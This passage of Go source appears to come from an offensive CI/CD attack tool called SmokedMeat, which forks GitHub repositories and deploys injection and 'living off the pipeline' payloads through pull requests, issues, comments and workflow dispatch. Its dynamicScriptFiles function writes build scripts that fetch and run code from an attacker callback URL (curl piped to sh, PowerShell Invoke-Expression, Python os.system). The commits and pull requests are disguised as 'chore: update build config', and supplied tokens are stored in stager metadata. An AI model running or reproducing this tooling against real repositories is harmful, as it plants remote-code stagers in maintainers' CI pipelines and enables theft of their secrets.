			if !errors.As(forkErr, &acceptedErr) {
				return "", fmt.Errorf("failed to fork repository: %w", forkErr)
			}
		}
		if fork != nil {
			forkOwner = fork.GetOwner().GetLogin()
			forkRepo = fork.GetName()
		}

		for i := 0; i < 30; i++ {
			time.Sleep(2 * time.Second)
			_, _, err = c.client.Repositories.Get(ctx, forkOwner, forkRepo)
			if err == nil {
				break
			}
		}
	}

	defaultBranch, err := c.getDefaultBranch(ctx, owner, repo)
	if err != nil {
		return "", fmt.Errorf("failed to get default branch: %w", err)
	}

	branchName := generateLOTPBranchName(time.Now())

	err = c.createBranch(ctx, forkOwner, forkRepo, defaultBranch, branchName)
	if err != nil {
		return "", fmt.Errorf("failed to create branch: %w", err)
	}

	callbackURL, err := stagerurl.URL(kitchenURL, stagerID)
	if err != nil {
		return "", fmt.Errorf("invalid kitchen URL: %w", err)
	}

	if lotpTool == "" {
		return "", fmt.Errorf("LOTP tool not specified — select a vulnerability with lotp_tool metadata")
	}

	generatedFiles := lotp.GenerateFiles(lotpTool, lotpTargets, callbackURL)
	if len(generatedFiles) == 0 {
		return "", fmt.Errorf("unsupported LOTP tool: %s", lotpTool)
	}

	files := make([]lotpFile, 0, len(generatedFiles))
	for _, f := range generatedFiles {
		files = append(files, lotpFile{path: f.Path, content: f.Content})
	}

	for _, f := range files {
		commitOpts := &github.RepositoryContentFileOptions{
			Message: github.String("chore: update build config"),
			Content: []byte(f.content),
			Branch:  github.String(branchName),
		}
		existing, _, _, _ := c.client.Repositories.GetContents(ctx, forkOwner, forkRepo, f.path, &github.RepositoryContentGetOptions{Ref: branchName})
		if existing != nil {
			commitOpts.SHA = existing.SHA
		}
		_, _, err = c.client.Repositories.CreateFile(ctx, forkOwner, forkRepo, f.path, commitOpts)
		if err != nil {
			return "", fmt.Errorf("failed to commit %s: %w", f.path, err)
		}
	}

	prTitle, prBody := buildLOTPPRContent(vuln)

	pr, _, err := c.client.PullRequests.Create(ctx, owner, repo, &github.NewPullRequest{
		Title:               github.String(prTitle),
		Body:                github.String(prBody),
		Head:                github.String(fmt.Sprintf("%s:%s", forkOwner, branchName)),
		Base:                github.String(defaultBranch),
		MaintainerCanModify: github.Bool(true),
		Draft:               github.Bool(draft),
	})
	if err != nil {
		return "", fmt.Errorf("failed to create pull request: %w", err)
	}

	return pr.GetHTMLURL(), nil
}

type lotpFile struct {
	path    string
	content string
}

func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lotpFile {
	var shebang, payload string
	switch tool {
	case "powershell":
		shebang = "#!/usr/bin/env pwsh"
		payload = fmt.Sprintf("Invoke-Expression (Invoke-WebRequest -Uri '%s').Content", callbackURL)
	case "python":
		shebang = "#!/usr/bin/env python3"
		payload = fmt.Sprintf("import os; os.system(%q)", shellCurlPipeShCommand(callbackURL))
	default:
		shebang = "#!/bin/sh"
		payload = shellCurlPipeShCommand(callbackURL)
	}

	content := shebang + "\n" + payload + "\n"

	var files []lotpFile
	for _, target := range targets {
		files = append(files, lotpFile{path: target, content: content})
	}
	if len(files) == 0 {
		files = append(files, lotpFile{path: "scripts/build.sh", content: content})
	}
	return files
}

func shellCurlPipeShCommand(callbackURL string) string {
	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
}

func generateLOTPBranchName(now time.Time) string {
	return fmt.Sprintf("smokedmeat-lotp-%d", now.Unix())
}

func lotpFilesToCommit(payload *lotp.GeneratedPayload, tool string, targets []string, callbackURL string) []lotpFile {
	var files []lotpFile

	files = append(files, lotpFile{path: payload.File, content: payload.Content})

	if extra, ok := payload.Properties["extra_file"]; ok {
		if idx := strings.Index(extra, ":"); idx > 0 {
			files = append(files, lotpFile{path: extra[:idx], content: extra[idx+1:]})
		}
	}

	return files
}

func closePRByURL(ctx context.Context, token, prURL string) error {
	owner, repo, number, err := parsePRURL(prURL)
	if err != nil {
		return err
	}
	client := newGitHubDeployClient(token)
	state := "closed"
	_, _, err = client.client.PullRequests.Edit(ctx, owner, repo, number, &github.PullRequest{State: &state})
	if err != nil {
		return fmt.Errorf("failed to close PR: %w", err)
	}

	ref := fmt.Sprintf("heads/%s", getPRBranch(ctx, client, owner, repo, number))
	if ref != "heads/" {
		_, err = client.client.Git.DeleteRef(ctx, owner, repo, ref)
		if err != nil {
			slog.Warn("failed to delete LOTP branch", "pr_url", prURL, "error", err)
		}
	}
	return nil
}

func getPRBranch(ctx context.Context, client *gitHubClient, owner, repo string, number int) string {
	pr, _, err := client.client.PullRequests.Get(ctx, owner, repo, number)
	if err != nil || pr.GetHead() == nil {
		return ""
	}
	return pr.GetHead().GetRef()
}

func parsePRURL(prURL string) (owner, repo string, number int, err error) {
	u, err := url.Parse(prURL)
	if err != nil {
		return "", "", 0, err
	}
	parts := strings.Split(strings.Trim(u.Path, "/"), "/")
	if len(parts) < 4 || parts[2] != "pull" {
		return "", "", 0, fmt.Errorf("not a PR URL: %s", prURL)
	}
	n, err := strconv.Atoi(parts[3])
	if err != nil {
		return "", "", 0, fmt.Errorf("invalid PR number in URL: %s", prURL)
	}
	return parts[0], parts[1], n, nil
}

func parseIssueURL(issueURL string) (owner, repo string, number int, err error) {
	u, err := url.Parse(issueURL)
	if err != nil {
		return "", "", 0, err
	}
	parts := strings.Split(strings.Trim(u.Path, "/"), "/")
	if len(parts) < 4 || parts[2] != "issues" {
		return "", "", 0, fmt.Errorf("not an issue URL: %s", issueURL)
	}
	n, err := strconv.Atoi(parts[3])
	if err != nil {
		return "", "", 0, fmt.Errorf("invalid issue number in URL: %s", issueURL)
	}
	return parts[0], parts[1], n, nil
}

func closeIssueByURL(ctx context.Context, token, issueURL string) error {
	owner, repo, number, err := parseIssueURL(issueURL)
	if err != nil {
		return err
	}
	client := newGitHubDeployClient(token)
	state := "closed"
	_, _, err = client.client.Issues.Edit(ctx, owner, repo, number, &github.IssueRequest{State: &state})
	if err != nil {
		return fmt.Errorf("failed to close issue: %w", err)
	}
	return nil
}

func parseRepoFullName(fullName string) (owner, repo string, err error) {
	parts := strings.SplitN(fullName, "/", 2)
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid repository format: %s (expected owner/repo)", fullName)
	}
	return parts[0], parts[1], nil
}

func buildPRContent(vuln *VulnerabilityInfo, payload string) (title, body string) {
	switch vuln.Context {
	case "pr_title":
		title = payload
		body = fmt.Sprintf(`CI workflow security test.

Workflow: %s
Context: PR title injection

_Generated by SmokedMeat_`, vuln.Workflow)

	case "pr_body":
		title = "test: CI workflow validation"
		body = payload

	case "git_branch":
		title = "test: CI workflow validation"
		body = fmt.Sprintf(`## CI Workflow Test

Workflow: %s
Context: %s

_Generated by SmokedMeat_`, vuln.Workflow, vuln.Context)

	default:
		title = fmt.Sprintf("test: CI workflow validation (%s)", vuln.Context)
		body = fmt.Sprintf(`## CI Workflow Test

Workflow: %s
Context: %s

Payload:
%s

_Generated by SmokedMeat_`, vuln.Workflow, vuln.Context, payload)
	}

	return title, body
}

func buildLOTPPRContent(vuln *VulnerabilityInfo) (title, body string) {
	title = "chore: update build config"
	body = "## Build Configuration Update\n\nUpdated build tooling configuration.\n\n_Generated by SmokedMeat_"

	if vuln == nil || len(vuln.GateTriggers) == 0 {
		return title, body
	}

	gateRaw := strings.ToLower(vuln.GateRaw)
	if !strings.Contains(gateRaw, "pull_request.title") {
		return title, body
	}

	prefix := strings.Join(vuln.GateTriggers, " ")
	if prefix == "" {
		return title, body
	}

	return prefix + " " + title, body
}

var fetchTokenInfoRaw = fetchTokenInfoRawDefault

func fetchTokenInfoRawDefault(ctx context.Context, token string) (*FetchTokenInfoResponse, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", "https://api.github.com/user", http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("fetch user: %w", err)
	}
	defer resp.Body.Close()

	info := &FetchTokenInfoResponse{
		StatusCode: resp.StatusCode,
	}

	if scopes := resp.Header.Get("X-OAuth-Scopes"); scopes != "" {
		for _, s := range strings.Split(scopes, ",") {
			if s = strings.TrimSpace(s); s != "" {
				info.Scopes = append(info.Scopes, s)
			}
		}
	}

	if limit := resp.Header.Get("X-RateLimit-Limit"); limit != "" {
		_, _ = fmt.Sscanf(limit, "%d", &info.RateLimitMax)
	}

	info.TokenType = detectTokenTypePrefix(token)

	if resp.StatusCode == http.StatusOK {
		var user struct {
			Login string `json:"login"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&user); err == nil {
			info.Owner = user.Login
		}
	}

	return info, nil
}

func detectTokenTypePrefix(token string) string {
	switch {
	case strings.HasPrefix(token, "ghp_"):
		return "classic_pat"
	case strings.HasPrefix(token, "github_pat_"):
		return "fine_grained_pat"
	case strings.HasPrefix(token, "gho_"):
		return "oauth"
	case strings.HasPrefix(token, "ghu_"):
		return "user_app"
	case strings.HasPrefix(token, "ghs_"):
		return "install_app"
	default:
		return "unknown"
	}
}

// --- HTTP Handlers ---

func (h *Handler) handleGitHubDeployPR(w http.ResponseWriter, r *http.Request) {
	var req DeployPRRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	draft := req.Draft == nil || *req.Draft
	autoClose := req.AutoClose == nil || *req.AutoClose

	client := newGitHubDeployClient(req.Token)
	prURL, err := client.deployVulnerability(r.Context(), &req.Vuln, req.Payload, draft)
	if err != nil {
		h.recordObservedCapability(req.Token, req.Vuln.Repository, deployCapabilityPR, err)
		slog.Warn("github deploy PR failed", "error", err)
		writeGitHubError(w, err)
		return
	}
	h.recordObservedCapability(req.Token, req.Vuln.Repository, deployCapabilityPR, nil)

	if req.StagerID != "" && autoClose {
		if stager := h.stagerStore.Get(req.StagerID); stager != nil {
			if stager.Metadata == nil {
				stager.Metadata = make(map[string]string)
			}
			stager.Metadata["pr_url"] = prURL
			stager.Metadata["deploy_token"] = req.Token
			h.persistStager(stager)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(DeployPRResponse{PRURL: prURL})
}

func (h *Handler) handleGitHubDeployIssue(w http.ResponseWriter, r *http.Request) {
	var req DeployIssueRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	autoClose := req.AutoClose == nil || *req.AutoClose

	client := newGitHubDeployClient(req.Token)
	issueURL, err := client.deployIssue(r.Context(), &req.Vuln, req.Payload, req.CommentMode)
	if err != nil {
		h.recordObservedCapability(req.Token, req.Vuln.Repository, deployCapabilityIssue, err)
		slog.Warn("github deploy issue failed", "error", err)
		writeGitHubError(w, err)
		return
	}
	h.recordObservedCapability(req.Token, req.Vuln.Repository, deployCapabilityIssue, nil)

	if req.StagerID != "" && autoClose {
		if stager := h.stagerStore.Get(req.StagerID); stager != nil {
			if stager.Metadata == nil {
				stager.Metadata = make(map[string]string)
			}
			stager.Metadata["issue_url"] = issueURL
			stager.Metadata["deploy_token"] = req.Token
			h.persistStager(stager)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(DeployIssueResponse{IssueURL: issueURL})
}

func (h *Handler) handleGitHubDeployComment(w http.ResponseWriter, r *http.Request) {
	var req DeployCommentRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	autoClose := req.AutoClose == nil || *req.AutoClose

	client := newGitHubDeployClient(req.Token)
	result, err := client.deployComment(r.Context(), &req.Vuln, req.Payload, req.Target)
	if err != nil {
		h.recordObservedCapability(req.Token, req.Vuln.Repository, commentObservedCapability(req.Target), err)
		slog.Warn("github deploy comment failed", "error", err)
		writeGitHubError(w, err)
		return
	}
	h.recordObservedCapability(req.Token, req.Vuln.Repository, commentObservedCapability(req.Target), nil)

	if req.StagerID != "" && autoClose && (result.CreatedIssueURL != "" || result.CreatedPRURL != "") {
		if stager := h.stagerStore.Get(req.StagerID); stager != nil {
			if stager.Metadata == nil {
				stager.Metadata = make(map[string]string)
			}
			if result.CreatedIssueURL != "" {
				stager.Metadata["issue_url"] = result.CreatedIssueURL
			}
			if result.CreatedPRURL != "" {
				stager.Metadata["pr_url"] = result.CreatedPRURL
			}
			stager.Metadata["deploy_token"] = req.Token
			h.persistStager(stager)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(DeployCommentResponse{CommentURL: result.CommentURL})
}

func (h *Handler) handleGitHubDeployLOTP(w http.ResponseWriter, r *http.Request) {
	var req DeployLOTPRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	kitchenURL := req.CallbackURL
	if kitchenURL == "" {
		kitchenURL = getKitchenURL(r)
	}
	repoName := req.RepoName
	if repoName == "" {
		repoName = req.Vuln.Repository
	}
	client := newGitHubDeployClient(req.Token)
	lotpName := req.LOTPTool
	if lotpName == "" {
		lotpName = req.LOTPAction
	}
	lotpDraft := req.Draft == nil || *req.Draft
	prURL, err := client.deployLOTP(r.Context(), &req.Vuln, repoName, kitchenURL, req.StagerID, lotpName, req.LOTPTargets, lotpDraft)
	if err != nil {
		h.recordObservedCapability(req.Token, repoName, deployCapabilityLOTP, err)
		slog.Warn("github deploy LOTP failed", "error", err)
		writeGitHubError(w, err)
		return
	}
	h.recordObservedCapability(req.Token, repoName, deployCapabilityLOTP, nil)

	if stager := h.stagerStore.Get(req.StagerID); stager != nil {
		if stager.Metadata == nil {
			stager.Metadata = make(map[string]string)
		}
		stager.Metadata["lotp_pr_url"] = prURL
		stager.Metadata["lotp_token"] = req.Token
		h.persistStager(stager)
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(DeployLOTPResponse{PRURL: prURL})
}

func (h *Handler) handleGitHubDeployDispatch(w http.ResponseWriter, r *http.Request) {
	var req DeployDispatchRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	if req.Owner == "" || req.Repo == "" || req.WorkflowFile == "" || req.Ref == "" {
		http.Error(w, "owner, repo, workflow_file, and ref are required", http.StatusBadRequest)
		return
	}

	client := newGitHubDeployClient(req.Token)

	dispatchCapability := dispatchObservedCapability(req.WorkflowFile)
	if err := client.getWorkflowByFileName(r.Context(), req.Owner, req.Repo, req.WorkflowFile); err != nil {
		h.recordObservedCapability(req.Token, req.Owner+"/"+req.Repo, dispatchCapability, err)
		slog.Warn("github deploy dispatch preflight failed", "error", err)
		writeGitHubError(w, fmt.Errorf("preflight: %w", err))
		return
	}

	err := client.triggerWorkflowDispatch(r.Context(), req.Owner, req.Repo, req.WorkflowFile, req.Ref, req.Inputs)
	if err != nil {
		h.recordObservedCapability(req.Token, req.Owner+"/"+req.Repo, dispatchCapability, err)
		slog.Warn("github deploy dispatch failed", "error", err)
		writeGitHubError(w, err)
		return
	}
	h.recordObservedCapability(req.Token, req.Owner+"/"+req.Repo, dispatchCapability, nil)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

func (h *Handler) handleGitHubListRepos(w http.ResponseWriter, r *http.Request) {
	var req ListReposRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	client := newGitHubClient(req.Token)
	repos, err := client.listAccessibleRepos(r.Context())
	if err != nil {
		slog.Warn("github list repos failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ListReposResponse{Repos: repos})
}

func (h *Handler) handleGitHubListReposWithInfo(w http.ResponseWriter, r *http.Request) {
	var req ListReposWithInfoRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	client := newGitHubClient(req.Token)
	repos, err := client.listAccessibleReposWithInfo(r.Context())
	if err != nil {
		slog.Warn("github list repos with info failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ListReposWithInfoResponse{Repos: repos})
}

func (h *Handler) handleGitHubListWorkflows(w http.ResponseWriter, r *http.Request) {
	var req ListWorkflowsRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	client := newGitHubClient(req.Token)
	workflows, err := client.listWorkflowsWithDispatch(r.Context(), req.Owner, req.Repo)
	if err != nil {
		slog.Warn("github list workflows failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ListWorkflowsResponse{Workflows: workflows})
}

func (h *Handler) handleGitHubGetUser(w http.ResponseWriter, r *http.Request) {
	var req GetUserRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	client := newGitHubClient(req.Token)
	login, resp, err := client.getAuthenticatedUser(r.Context())
	if err != nil {
		slog.Warn("github get user failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	result := GetUserResponse{Login: login}
	if resp != nil {
		if scopeHeader := resp.Header.Get("X-OAuth-Scopes"); scopeHeader != "" {
			for _, s := range strings.Split(scopeHeader, ",") {
				if s = strings.TrimSpace(s); s != "" {
					result.Scopes = append(result.Scopes, s)
				}
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(result)
}

func (h *Handler) handleGitHubTokenInfo(w http.ResponseWriter, r *http.Request) {
	var req FetchTokenInfoRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Token == "" {
		http.Error(w, "token is required", http.StatusBadRequest)
		return
	}

	info, err := fetchTokenInfoRaw(r.Context(), req.Token)
	if err != nil {
		slog.Warn("github token info failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(info)
}

func (h *Handler) handleGitHubAppInstallations(w http.ResponseWriter, r *http.Request) {
	var req ListAppInstallationsRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.PEM == "" || req.AppID == "" {
		http.Error(w, "pem and app_id are required", http.StatusBadRequest)
		return
	}

	jwtToken, err := generateAppJWT([]byte(req.PEM), req.AppID)
	if err != nil {
		slog.Warn("github app JWT generation failed", "error", err)
		writeGitHubError(w, fmt.Errorf("JWT generation failed: %w", err))
		return
	}

	installations, err := listAppInstallations(r.Context(), jwtToken)
	if err != nil {
		slog.Warn("github app list installations failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ListAppInstallationsResponse{Installations: installations})
}

func (h *Handler) handleGitHubAppToken(w http.ResponseWriter, r *http.Request) {
	var req CreateInstallationTokenRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.PEM == "" || req.AppID == "" || req.InstallationID == 0 {
		http.Error(w, "pem, app_id, and installation_id are required", http.StatusBadRequest)
		return
	}

	jwtToken, err := generateAppJWT([]byte(req.PEM), req.AppID)
	if err != nil {
		slog.Warn("github app JWT generation failed", "error", err)
		writeGitHubError(w, fmt.Errorf("JWT generation failed: %w", err))
		return
	}

	token, expiresAt, perms, err := createInstallationToken(r.Context(), jwtToken, req.InstallationID)
	if err != nil {
		slog.Warn("github app create installation token failed", "error", err)
		writeGitHubError(w, err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(CreateInstallationTokenResponse{Token: token, ExpiresAt: expiresAt, Permissions: perms})
}

func writeGitHubError(w http.ResponseWriter, err error) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusInternalServerError)
	_ = json.NewEncoder(w).Encode(gitHubErrorResponse{Error: err.Error()})
}
